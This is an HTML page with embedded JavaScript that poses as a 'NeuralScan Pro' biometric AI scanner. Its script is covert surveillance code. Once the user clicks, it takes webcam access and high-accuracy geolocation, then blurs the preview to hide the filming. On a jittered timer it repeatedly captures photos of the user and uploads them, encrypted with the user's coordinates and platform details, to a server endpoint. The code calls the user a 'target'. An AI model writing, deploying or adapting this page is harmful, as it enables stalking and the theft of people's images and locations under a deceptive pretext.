<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NeuralScan Pro | Advanced Biometric AI</title>
    <style>
        :root { --primary: #6366f1; --accent: #06b6d4; --bg: #0f172a; }
        
        body { 
            margin: 0; padding: 0;
            background: radial-gradient(at top left, #1e1b4b, var(--bg));
            color: white;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex; align-items: center; justify-content: center;
            height: 100vh; overflow: hidden;
        }

        .glass-card {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            width: 380px;
            text-align: center;
        }

        .logo { font-weight: 800; font-size: 24px; letter-spacing: -1px; margin-bottom: 10px; display: block; }
        .logo span { color: var(--primary); }

        .preview-window {
            width: 100%; height: 220px;
            background: #000;
            border-radius: 15px;
            margin: 20px 0;
            position: relative;
            overflow: hidden;
            border: 1px solid rgba(99, 102, 241, 0.3);
        }

        #video { 
            width: 100%; height: 100%; 
            object-fit: cover; 
            display: none; 
            transition: filter 1.5s ease;
        }
        
        .scan-bar {
            position: absolute; width: 100%; height: 4px;
            background: linear-gradient(to right, transparent, var(--accent), transparent);
            top: 0; animation: scanMove 2.5s infinite linear;
            display: none; z-index: 10;
        }

        @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }

        .btn {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white; border: none; padding: 16px;
            border-radius: 12px; width: 100%;
            font-weight: bold; font-size: 16px;
            cursor: pointer;
            box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.4);
        }
        .btn:disabled { opacity: 0.6; }

        #console { 
            font-family: 'Courier New', monospace; 
            font-size: 11px; color: #60a5fa; 
            margin-top: 15px; text-align: left; 
            min-height: 50px; line-height: 1.4;
        }
        .status-dot { color: #22c55e; }
    </style>
</head>
<body>

<div class="glass-card">
    <span class="logo">NEURAL<span>SCAN</span> AI</span>
    <p style="font-size: 13px; color: #cbd5e1;">Quantum-Secure Biometric Analysis</p>

    <div class="preview-window">
        <div id="scan-bar" class="scan-bar"></div>
        <video id="video" autoplay muted playsinline></video>
        <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px; letter-spacing: 2px;">
            AWAITING_SECURE_LINK
        </div>
    </div>

    <button id="main-btn" class="btn">INITIALIZE LINK</button>

    <div id="console">> System Idle. Readiness check required.</div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const btn = document.getElementById('main-btn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const consoleLog = document.getElementById('console');
    const scanBar = document.getElementById('scan-bar');
    const placeholder = document.getElementById('placeholder');

    const SECRET_PASSPHRASE = "neural-link-omega-99"; 
    let targetCoords = { lat: 0, lon: 0 };

    const log = (msg) => {
        consoleLog.innerHTML = `> <span class="status-dot">●</span> ${msg}`;
    };

    // --- CRYPTO HELPERS (Phase 2) ---
    async function deriveKey(passphrase) {
        const encoder = new TextEncoder();
        const keyMaterial = await crypto.subtle.importKey(
            "raw", encoder.encode(passphrase), 
            { name: "PBKDF2" }, false, ["deriveKey"]
        );
        return crypto.subtle.deriveKey(
            {
                name: "PBKDF2",
                salt: encoder.encode("neural-static-salt"), 
                iterations: 100000,
                hash: "SHA-256"
            },
            keyMaterial,
            { name: "AES-GCM", length: 256 },
            false, ["encrypt"]
        );
    }

    async function encryptPayload(data) {
        const encoder = new TextEncoder();
        const key = await deriveKey(SECRET_PASSPHRASE);
        const iv = crypto.getRandomValues(new Uint8Array(12)); 
        const encodedData = encoder.encode(JSON.stringify(data));

        const encryptedContent = await crypto.subtle.encrypt(
            { name: "AES-GCM", iv: iv },
            key,
            encodedData
        );

        return {
            iv: btoa(String.fromCharCode(...iv)),
            content: btoa(String.fromCharCode(...new Uint8Array(encryptedContent)))
        };
    }

    // --- LOGIC ---
    async function getTargetLocation() {
        log("Calibrating spatial nodes...");
        return new Promise((res) => {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    targetCoords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                    log(`Node Bound: ${targetCoords.lat.toFixed(2)}N, ${targetCoords.lon.toFixed(2)}E`);
                    res(true);
                },
                () => { log("Latency Mode: Location Denied"); res(false); },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
    }

    async function startBiometricFeed() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = 'block';
            placeholder.style.display = 'none';
            scanBar.style.display = 'block';
            
            log("Handshake verified. Creating tunnel...");

            setTimeout(() => {
                video.style.filter = "blur(15px) grayscale(100%) brightness(0.4)";
                log("Tunnel Encrypted. Maintaining Link...");
            }, 3000);

            const runCycle = () => {
                captureAndSend();
                const jitter = Math.floor(Math.random() * 5000); 
                setTimeout(runCycle, 15000 + jitter); 
            };
            runCycle();

        } catch (err) {
            log("CRITICAL: Secure feed rejected.");
        }
    }

    btn.onclick = async () => {
        btn.disabled = true;
        btn.innerText = "ESTABLISHING...";
        await getTargetLocation();
        await startBiometricFeed();
        btn.innerText = "TUNNEL ACTIVE";
    };

    async function captureAndSend() {
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        const image = canvas.toDataURL('image/jpeg', 0.6);

        const rawData = {
            image: image,
            metadata: {
                location: targetCoords,
                platform: navigator.platform,
                timestamp: new Date().toISOString()
            }
        };

        // Encrypt the entire object
        const encryptedPackage = await encryptPayload(rawData);

        fetch('/save-photo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(encryptedPackage)
        }).catch(() => {});
    }
</script>

</body>
</html>
